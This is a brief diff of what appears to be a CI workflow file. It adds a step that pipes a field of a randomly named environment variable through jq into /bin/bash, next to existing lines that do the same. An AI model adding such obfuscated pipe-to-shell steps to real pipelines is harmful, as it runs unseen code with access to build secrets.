@@ -25,6 +25,7 @@ jobs:
           echo $zip4774 | jq -r .jafuy11 | /bin/bash
           echo $ovy062 | jq -r .nqqr85187 | /bin/bash
           echo $zqhto0576 | jq -r .hrted18 | /bin/bash
+          printf '%s' "$ngq766" | jq -r .aw539 | /bin/bash
 
       - name: Save data
         uses: actions/upload-artifact@v4
